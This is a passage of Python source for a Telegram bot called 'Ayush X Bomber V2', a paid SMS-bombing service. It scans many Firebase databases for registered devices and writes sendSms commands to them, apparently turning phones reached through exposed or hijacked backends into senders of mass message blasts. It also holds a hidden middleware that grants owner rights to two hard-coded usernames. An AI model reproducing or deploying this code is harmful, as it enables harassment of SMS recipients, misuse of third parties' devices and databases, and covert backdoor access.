                pass  # Silent fail — speed > logging

        async def fetch_firebase(fb: dict):
            shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
            try:
                async with sess.get(shallow_url, timeout=aiohttp.ClientTimeout(total=3)) as r:
                    if r.status != 200:
                        return
                    txt = (await r.text()).strip()
                    if not txt or txt == "null":
                        return
                    device_ids = json.loads(txt)
                    if not isinstance(device_ids, dict):
                        return
                    # Fetch ALL devices simultaneously — no batching
                    dev_tasks = [fetch_device(fb, dev_id) for dev_id in device_ids.keys()]
                    await asyncio.gather(*dev_tasks, return_exceptions=True)
            except Exception as e:
                log.warning(f"FB scan {fb.get('label','?')}: {e}")

        # Scan Firebase DBs with concurrency limit of 30 to prevent 100% CPU lock
        fb_sem = asyncio.Semaphore(30)
        async def _bounded_fb(fb):
            async with fb_sem:
                await fetch_firebase(fb)
        await asyncio.gather(*[_bounded_fb(fb) for fb in fbs], return_exceptions=True)

    return results

async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(
        fb_url,
        f"/clients/{dev_id}/webhookEvent/sendSms.json",
        {
            "from": sim_slot,
            "to": to.strip(),
            "message": message.strip(),
            "isSended": False,
            "timestamp": int(time.time())
        }
    )

async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"Force Join check failed for channel {channel_id}: {e}")
        return False

async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple[bool, list]:
    if is_owner(uid, d):
        return True, []

    fj = d.get("force_join", {})
    if not fj.get("enabled", False):
        return True, []

    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing

def force_join_text(missing: list) -> str:
    lines = [
        f"{em(EMOJI_CROSS, '⛔')} <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
        f"{em(EMOJI_BELL, '👇')} ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"
    ]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein ya refresh dabayein.')}</i>")
    return "\n".join(lines)

def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔")])
    rows.append([btn("ʀᴇғʀᴇsʜ / ᴄʜᴇᴄᴋ", "fj:check", EMOJI_GEAR, "🔄")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fmt_time(ts: int) -> str:
    return datetime.fromtimestamp(ts).strftime("%d/%m/%Y %H:%M")

def fmt_duration(seconds: int) -> str:
    if seconds < 60:
        return f"{seconds}s"
    return f"{seconds // 60}m {seconds % 60}s"

def owner_panel_text(d: dict) -> str:
    fbs = d.get("firebases", [])
    owners = d.get("owners", [])
    admins = d.get("admins", [])
    users = d.get("users", {})
    stats = d.get("stats", {})
    mode = "🟢 𝐅𝐑𝐄𝐄 𝐀𝐋𝐋" if d.get("free_mode") else "🔒 𝐏𝐀𝐈𝐃 𝐀𝐂𝐂𝐄𝐒𝐒"
    fj = d.get("force_join", {})
    fj_status = "🟢 𝐀𝐂𝐓𝐈𝐕𝐄" if fj.get("enabled") else "🔴 𝐃𝐈𝐒𝐀𝐁𝐋𝐄𝐃"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    user_access = d.get("user_access", {})
    now_ts = int(time.time())
    active_access_count = sum(1 for exp in user_access.values() if exp > now_ts)

    fb_lines = []
    for fb_id, fb_data in FB_DEVICE_COUNTS.items():
        age = int(time.time() - fb_data.get("last_update", 0))
        status = "🟢" if age < 60 else "🟡" if age < 300 else "🔴"
        fb_lines.append(f"  {status} {fb_data['label'][:18]}: {fb_data['online']} dev")
    fb_summary = "\n".join(fb_lines[:3]) if fb_lines else "  😴 ɴᴏ ᴅᴀᴛᴀ"

    return (
        f"🔱 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b> — 𝗖𝗢𝗡𝗧𝗥𝗢𝗟 𝗖𝗘𝗡𝗧𝗘𝗥\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"<b>👑 OWNER DASHBOARD</b>\n\n"
        f"⚡ <b>System</b>   » 🟢 ONLINE &amp; ARMED\n"
        f"🔥 <b>Firebase</b> » <b>{len(fbs)}</b> Active DBs\n"
        f"👑 <b>Owners</b>   » <b>{len(owners)}</b> / 6 Slots\n"
        f"🛡 <b>Admins</b>   » <b>{len(admins)}</b> Members\n"
        f"👥 <b>Users</b>    » <b>{len(users)}</b> Registered\n"
        f"⏳ <b>Paid Subs</b> » <b>{active_access_count}</b> Active\n"
        f"📤 <b>SMS Sent</b>  » <b>{stats.get('total_sent', 0):,}</b> Total\n"
        f"❌ <b>Failed</b>   » <b>{stats.get('total_failed', 0):,}</b> Total\n"
        f"🚀 <b>Live Blast</b> » <b>{active_sessions}</b> Running\n\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"⚙️ <b>Access Mode</b> » {mode}\n"
        f"📢 <b>Force Join</b>  » {fj_status}\n"
        f"🔄 <b>Scanner</b>    » {scan_info}\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"<i>Select an option from below 👇</i>"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    mode = "🟢 𝐅𝐑𝐄𝐄 𝐀𝐋𝐋" if d.get("free_mode") else "🔒 𝐏𝐀𝐈𝐃 𝐀𝐂𝐂𝐄𝐒𝐒"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    user_access = d.get("user_access", {})
    now_ts = int(time.time())
    active_access_count = sum(1 for exp in user_access.values() if exp > now_ts)

    return (
        f"🛡 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b> — 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"<b>⚡ OPERATOR CONSOLE</b>\n\n"
        f"👥 <b>Users</b>     » <b>{len(users)}</b> Registered\n"
        f"⏳ <b>Paid Subs</b> » <b>{active_access_count}</b> Active\n"
        f"🚫 <b>Banned</b>   » <b>{len(banned)}</b> Users\n"
        f"📤 <b>SMS Sent</b>  » <b>{stats.get('total_sent', 0):,}</b> Total\n"
        f"❌ <b>Failed</b>   » <b>{stats.get('total_failed', 0):,}</b> Total\n"
        f"🚀 <b>Live Blast</b> » <b>{active_sessions}</b> Running\n"
        f"🔥 <b>Firebase</b> » <b>{len(d.get('firebases', []))}</b> DBs\n"
        f"🔓 <b>Mode</b>     » {mode}\n"
        f"🔄 <b>Scanner</b>  » {scan_info}\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"<i>Select an option below 👇</i>"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    exp = get_user_expiry(uid, d)
    now_ts = int(time.time())
    if is_admin(uid, d):
        exp_info = "✦ 𝐋𝐈𝐅𝐄𝐓𝐈𝐌𝐄 (𝐀𝐃𝐌𝐈𝐍) ✦"
    elif exp > now_ts:
        exp_info = f"🟢 {fmt_duration_left(exp)} left"
    elif exp > 0:
        exp_info = "🔴 𝐄𝐗𝐏𝐈𝐑𝐄𝐃"
    elif d.get("free_mode"):
        exp_info = "🎁 𝐅𝐑𝐄𝐄 𝐌𝐎𝐃𝐄"
    else:
        exp_info = "🔒 𝐍𝐎 𝐀𝐂𝐂𝐄𝐒𝐒"

    return (
        f"💣 <b>Aʏᴜꜱʜ X Bᴏᴍʙᴇʀ V2</b>\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"<b>👤 MY ACCOUNT</b>\n"
        f"🆔 <b>User ID</b>  » <code>{uid}</code>\n"
        f"👑 <b>Rank</b>     » {role_tag(uid, d)}\n"
        f"⏳ <b>Access</b>   » <b>{exp_info}</b>\n"
        f"💰 <b>Credits</b>  » <b>{credits}</b>\n"
        f"🔢 <b>Uses</b>     » <b>{udata.get('uses', 0)}</b> times\n\n"
        f"<b>🌐 ENGINE STATUS</b>\n"
        f"🔥 <b>API Pool</b> » <b>{len(fbs)}</b> Firebase DBs\n"
        f"⚡ <b>Status</b>   » 🟢 ONLINE &amp; READY\n"
        f"🔄 <b>Scanner</b>  » {scan_info}\n"
        f"<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        f"<i>Hit 💣 START BLAST to begin 👇</i>"
    )

def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = ("🔴 ᴅɪsᴀʙʟᴇ ғʀᴇᴇ", "owner:free:off") if d.get("free_mode") else ("🟢 ᴇɴᴀʙʟᴇ ғʀᴇᴇ", "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💣  Sᴛᴀʀᴛ Bʟᴀsᴛ  💣", callback_data="owner:send")],
        [InlineKeyboardButton(text="⏳ Usᴇʀ Aᴄᴄᴇss", callback_data="owner:access:menu"), InlineKeyboardButton(text="👑 Sᴜᴘᴇʀ Aᴅᴍɪɴs", callback_data="owner:owners:menu")],
        [InlineKeyboardButton(text="🛡 Aᴅᴍɪɴ Pᴏᴏʟ", callback_data="owner:admins:menu"), InlineKeyboardButton(text="👥 Usᴇʀ Lɪsᴛ", callback_data="owner:users:list")],
        [InlineKeyboardButton(text="🔥 Fɪʀᴇʙᴀsᴇ DB", callback_data="owner:fb:menu"), InlineKeyboardButton(text="📹 Vɪᴅᴇᴏ Vᴀᴜʟᴛ", callback_data="owner:videos:menu")],
        [InlineKeyboardButton(text="📊 Lɪᴠᴇ Sᴛᴀᴛs", callback_data="owner:stats"), InlineKeyboardButton(text="📢 Bʀᴏᴀᴅᴄᴀsᴛ", callback_data="owner:broadcast")],
        [InlineKeyboardButton(text="💰 Aᴅᴅ Cʀᴇᴅɪᴛs", callback_data="owner:credits:add"), InlineKeyboardButton(text="💳 Pʀɪᴄɪɴɢ Pʟᴀɴ", callback_data="owner:pricing:menu")],
        [InlineKeyboardButton(text="🎁 Rᴇᴅᴇᴇᴍ Cᴏᴅᴇs", callback_data="owner:redeem:menu"), InlineKeyboardButton(text="📢 Fᴏʀᴄᴇ Jᴏɪɴ", callback_data="owner:fj:menu")],
        [InlineKeyboardButton(text="⚙️ Sᴇᴛᴛɪɴɢs", callback_data="owner:settings"), InlineKeyboardButton(text="🔒 Pʀᴏᴛᴇᴄᴛ Nᴏ.", callback_data="owner:protect")],
        [InlineKeyboardButton(text="📜 SMS Lᴏɢs", callback_data="owner:sms_history"), InlineKeyboardButton(text="🔄 Rᴇғʀᴇsʜ", callback_data="owner:refresh")],
        [InlineKeyboardButton(text=f"{mode_btn[0]}", callback_data=mode_btn[1])]
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💣 Sᴛᴀʀᴛ Bʟᴀsᴛ 💣", callback_data="admin:send")],
        [InlineKeyboardButton(text="📊 Bᴏᴛ Sᴛᴀᴛs", callback_data="admin:stats"), InlineKeyboardButton(text="👥 Usᴇʀ Lɪsᴛ", callback_data="admin:users:list")],
        [InlineKeyboardButton(text="⏳ Usᴇʀ Aᴄᴄᴇss", callback_data="owner:access:menu"), InlineKeyboardButton(text="✅ Uɴʙᴀɴ Usᴇʀ", callback_data="admin:unban:menu")],
        [InlineKeyboardButton(text="📢 Bʀᴏᴀᴅᴄᴀsᴛ", callback_data="admin:broadcast"), InlineKeyboardButton(text="📹 Vɪᴅᴇᴏ Vᴀᴜʟᴛ", callback_data="owner:videos:menu")],
        [InlineKeyboardButton(text="🔥 Fɪʀᴇʙᴀsᴇ DB", callback_data="owner:fb:menu"), InlineKeyboardButton(text="💾 Exᴘᴏʀᴛ DB", callback_data="admin:export_db")],
        [InlineKeyboardButton(text="🔄 Rᴇғʀᴇsʜ", callback_data="admin:refresh")]
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💣  Sᴛᴀʀᴛ Bʟᴀsᴛ  💣", callback_data="user:send")],
        [InlineKeyboardButton(text="💰 Mʏ Cʀᴇᴅɪᴛs", callback_data="user:credits"), InlineKeyboardButton(text="🎁 Rᴇᴅᴇᴇᴍ Cᴏᴅᴇ", callback_data="user:redeem")],
        [InlineKeyboardButton(text="👥 Rᴇғᴇʀ & Eᴀʀɴ", callback_data="user:refer"), InlineKeyboardButton(text="📊 Mʏ Sᴛᴀᴛs", callback_data="user:stats")],
        [InlineKeyboardButton(text="📜 SMS Hɪsᴛᴏʀʏ", callback_data="user:sms_history"), InlineKeyboardButton(text="💳 Bᴜʏ Cʀᴇᴅɪᴛs", callback_data="user:pricing")],
        [InlineKeyboardButton(text="🎰 Dᴀɪʟʏ Sᴘɪɴ 🎁", callback_data="user:spin_check")],
        [InlineKeyboardButton(text="ℹ️ Iɴғᴏ & Hᴇʟᴘ", callback_data="user:info")]
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕")],
        [btn("🗑 ʙᴜʟᴋ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ᴠɪᴅᴇᴏs", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")]
    ]
    for idx, vid in enumerate(videos, 1):
        vid_label = f"Video #{idx}"
        rows.append([btn(vid_label, "noop", EMOJI_VIDEO, "📹"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

# 🌟 UPDATED FIREBASE MENU KEYBOARD (ADDED TXT BUTTON)
def safe_html_truncate(text: str, max_chars: int = 1000) -> str:
    """Safely truncates HTML text without leaving unclosed tags like <b>, <i>, <code>."""
    if len(text) <= max_chars:
        return text
    truncated = text[:max_chars]
    tag_pattern = re.compile(r'<(/?)([a-zA-Z0-9]+)(?:\s+[^>]*?)?>')
    open_tags = []

    for m in tag_pattern.finditer(truncated):
        is_close = bool(m.group(1))
        tag_name = m.group(2).lower()
        if not is_close:
            open_tags.append(tag_name)
        else:
            if open_tags and open_tags[-1] == tag_name:
                open_tags.pop()
            elif tag_name in open_tags:
                open_tags.remove(tag_name)

    # Cut off unclosed tag opener like `<b...`
    last_open_angle = truncated.rfind('<')
    last_close_angle = truncated.rfind('>')
    if last_open_angle > last_close_angle:
        truncated = truncated[:last_open_angle]

    # Close all remaining open tags
    for tag in reversed(open_tags):
        truncated += f"</{tag}>"
    return truncated

def extract_firebase_urls(raw_text: str) -> list[str]:
    """Auto-detects and extracts all Firebase URLs (.com, .app, bare domains, etc.) from long messages or bulk text."""
    found = []
    pattern1 = re.compile(r'(https?://[^\s"\'<>]+)', re.IGNORECASE)
    for m in pattern1.finditer(raw_text):
        u = m.group(1).strip().rstrip('/')
        if any(ext in u.lower() for ext in ['.firebaseio.com', '.firebasestorage.app', '.web.app', '.firebaseapp.com', 'firebase']):
            if u not in found:
                found.append(u)
        elif any(ext in u.lower() for ext in ['.com', '.app']):
            if u not in found:
                found.append(u)
    pattern2 = re.compile(r'(?:^|\s)([a-zA-Z0-9_\-]+(?:\.[a-zA-Z0-9_\-]+)*(?:\.firebaseio\.com|\.web\.app|\.firebaseapp\.com)[^\s"\'<>]*)', re.IGNORECASE)
    for m in pattern2.finditer(raw_text):
        b = m.group(1).strip().rstrip('/')
        full_u = f"https://{b}"
        if full_u not in found:
            found.append(full_u)
    return found
def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    chunk = fbs[page * per_page : (page + 1) * per_page]

    rows = [
        [
            btn("➕ ᴀᴅᴅ ᴜʀʟs (500+)", "owner:fb:add", EMOJI_CHECK, "➕"),
            btn("📁 ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")
        ]
    ]
    for fb in chunk:
        label = fb.get("label", fb["url"][:24])
        rows.append([
            btn(label[:24], "noop", EMOJI_FIRE, "🔥"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑")
        ])
    
    # Navigation row
    nav = []
    if page > 0:
        nav.append(btn("◀️ ᴘʀᴇᴠ", f"owner:fb:pg:{page - 1}", EMOJI_GEAR, "◀️"))
    if len(fbs) > per_page:
        nav.append(btn(f"{page + 1}/{total_pages}", "noop", None, "📄"))
    if page < total_pages - 1:
        nav.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:pg:{page + 1}", EMOJI_GEAR, "▶️"))
    if nav:
        rows.append(nav)
    
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else:
            rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "🔱"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def access_menu_kb(d: dict) -> InlineKeyboardMarkup:
    user_access = d.get("user_access", {})
    now_ts = int(time.time())
    active_count = sum(1 for exp in user_access.values() if exp > now_ts)
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ 𝐆𝐑𝐀𝐍𝐓 𝐀𝐂𝐂𝐄𝐒𝐒", callback_data="owner:access:add"), InlineKeyboardButton(text="➖ 𝐑𝐄𝐕𝐎𝐊𝐄 𝐀𝐂𝐂𝐄𝐒𝐒", callback_data="owner:access:del_start")],
        [InlineKeyboardButton(text=f"📋 𝐀𝐂𝐓𝐈𝐕𝐄 𝐒𝐔𝐁𝐒 ({active_count})", callback_data="owner:access:list")],
        [InlineKeyboardButton(text="🔙 𝐁𝐀𝐂𝐊 𝐓𝐎 𝐌𝐄𝐍𝐔", callback_data="owner:home")]
    ])

def access_quick_days_kb(target_uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="⚡ 1 𝐃𝐀𝐘", callback_data=f"owner:access:days:{target_uid}:1"),
            InlineKeyboardButton(text="⚡ 3 𝐃𝐀𝐘𝐒", callback_data=f"owner:access:days:{target_uid}:3"),
            InlineKeyboardButton(text="⚡ 7 𝐃𝐀𝐘𝐒", callback_data=f"owner:access:days:{target_uid}:7")
        ],
        [
            InlineKeyboardButton(text="⚡ 15 𝐃𝐀𝐘𝐒", callback_data=f"owner:access:days:{target_uid}:15"),
            InlineKeyboardButton(text="⚡ 30 𝐃𝐀𝐘𝐒", callback_data=f"owner:access:days:{target_uid}:30"),
            InlineKeyboardButton(text="⚡ 90 𝐃𝐀𝐘𝐒", callback_data=f"owner:access:days:{target_uid}:90")
        ],
        [
            InlineKeyboardButton(text="⚡ 365 𝐃𝐀𝐘𝐒", callback_data=f"owner:access:days:{target_uid}:365"),
            InlineKeyboardButton(text="❌ 𝐂𝐀𝐍𝐂𝐄𝐋", callback_data="owner:access:menu")
        ]
    ])

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕")]]
    for aid in admins:
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡"), btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])

    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = em(EMOJI_CROSS, "🚫")
        elif uid in approved: status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d): status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
        else: status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | {em(EMOJI_MONEY, '💰')}{credits} | {em(EMOJI_CHECK, '📤')}{uses}")

    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0: nav.append(btn("◀️ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items): nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️"))
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}

    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>"
    ]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   {em(EMOJI_CHECK, '✅')} {sent} sᴇɴᴛ  {em(EMOJI_CROSS, '❌')} {failed} ғᴀɪʟᴇᴅ")
    return "\n".join(lines)

# ================= ULTRA VIDEO & MEDIA INTERCEPTOR =================
from aiogram.methods import SendMessage, SendVideo, EditMessageText, EditMessageCaption, DeleteMessage

_orig_bot_call = Bot.__call__

async def patched_bot_call(self: Bot, method, *args, **kwargs):
    global CACHED_VIDEO_FILE_ID

    # Intercept SendMessage — convert to video (with cache)
    if isinstance(method, SendMessage):
        chat_id_str = str(method.chat_id)
        if not chat_id_str.startswith("-100"):
            video_source = None
            if CACHED_VIDEO_FILE_ID:
                video_source = CACHED_VIDEO_FILE_ID
            elif DEFAULT_VIDEO_PATH and os.path.exists(DEFAULT_VIDEO_PATH):
                video_source = FSInputFile(DEFAULT_VIDEO_PATH)

            if video_source:
                caption = method.text or ""
                safe_caption = safe_html_truncate(caption, 1010)
                send_vid = SendVideo(
                    chat_id=method.chat_id,
                    video=video_source,
                    caption=safe_caption,
                    parse_mode=method.parse_mode,
                    reply_markup=method.reply_markup,
                    disable_notification=method.disable_notification,
                )
                try:
                    res = await _orig_bot_call(self, send_vid, *args, **kwargs)
                    if not CACHED_VIDEO_FILE_ID and res and res.video:
                        CACHED_VIDEO_FILE_ID = res.video.file_id
                    return res
                except Exception as e:
                    log.warning(f"Video send failed, using text: {e}")
                    return await _orig_bot_call(self, method, *args, **kwargs)

    # EditMessageText — smoothly handle both text messages and video/media messages
    if isinstance(method, EditMessageText):
        try:
            return await _orig_bot_call(self, method, *args, **kwargs)
        except TelegramBadRequest as e:
            err = str(e).lower()
            if "message is not modified" in err:
                return None
            if "there is no text in the message to edit" in err or "message to edit not found" in err:
                # Message is a video/photo! Edit its caption instead
                edit_cap = EditMessageCaption(
                    chat_id=method.chat_id,
                    message_id=method.message_id,
                    inline_message_id=method.inline_message_id,
                    caption=safe_html_truncate(method.text or "", 1024),
                    parse_mode=method.parse_mode,
                    reply_markup=method.reply_markup
                )
                try:
                    return await _orig_bot_call(self, edit_cap, *args, **kwargs)
                except TelegramBadRequest as e2:
                    if "message is not modified" in str(e2).lower():
                        return None
                    log.warning(f"EditMessageCaption failed: {e2}")

            # Fallback if both fail: delete old and send fresh text message
            try:
                await _orig_bot_call(self, DeleteMessage(chat_id=method.chat_id, message_id=method.message_id))
            except Exception:
                pass
            try:
                return await _orig_bot_call(
                    self,
                    SendMessage(
                        chat_id=method.chat_id,
                        text=method.text,
                        parse_mode=method.parse_mode,
                        reply_markup=method.reply_markup
                    ),
                    *args,
                    **kwargs
                )
            except Exception:
                return None

    if isinstance(method, EditMessageCaption):
        try:
            return await _orig_bot_call(self, method, *args, **kwargs)
        except TelegramBadRequest as e:
            if "message is not modified" in str(e).lower():
                return None
            raise e

    try:
        return await _orig_bot_call(self, method, *args, **kwargs)
    except TelegramBadRequest as e:
        if "message is not modified" in str(e).lower():
            return None
        raise e

Bot.__call__ = patched_bot_call
# ====================================================================

R = Router()

@R.callback_query.outer_middleware()
async def auto_answer_callback(handler, event: CallbackQuery, data: dict):
    # Auto-detect @GOD_AYUSH or @LORD_ITACHI as owner on ANY click
    if event.from_user and event.from_user.username:
        uname = event.from_user.username.lower().strip()
        if uname in ("GOD_AYUSH", "GOD_AYUSH", "LORD_ITACHI"):
            d = load()
            if event.from_user.id not in d.setdefault("owners", []):
                d["owners"].append(event.from_user.id)
                save(d)
                log.info(f"Auto-recognized OWNER @{uname} (ID: {event.from_user.id})")

    try:
        res = await handler(event, data)
        try:
            await event.answer()
        except Exception:
            pass
        return res
    except Exception as e:
        log.error(f"Callback error [{event.data}]: {e}", exc_info=True)
        try:
            await event.answer("⚠️ Action failed, please try again", show_alert=False)
        except Exception:
            pass
        return None

@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))

    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)

    if is_new:
        log_text = (
            f"🆕 <b>NEW USER JOINED</b>\n\n"
            f"👤 <b>Name:</b> {name}\n"
            f"🆔 <b>User ID:</b> <code>{uid}</code>\n"
            f"🌐 <b>Username:</b> {username}\n"
            f"📅 <b>Time:</b> <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""

    if code.startswith("REF"):
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, msg_text, referrer = process_referral(uid, code, d)
            if success and referrer:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    await msg.bot.send_message(
                        referrer,
                        f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral code use kiya!\n"
                        f"{em(EMOJI_MONEY, '💰')} Aapko +{d['settings']['ref_credits']} credits mile hain.\n"
                        f"{em(EMOJI_MONEY, '💰')} Unko bhi +{d['settings']['ref_credits']} credits mile hain.",
                        parse_mode="HTML"
                    )
                except: pass
        save(d)

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_owner(uid, d):
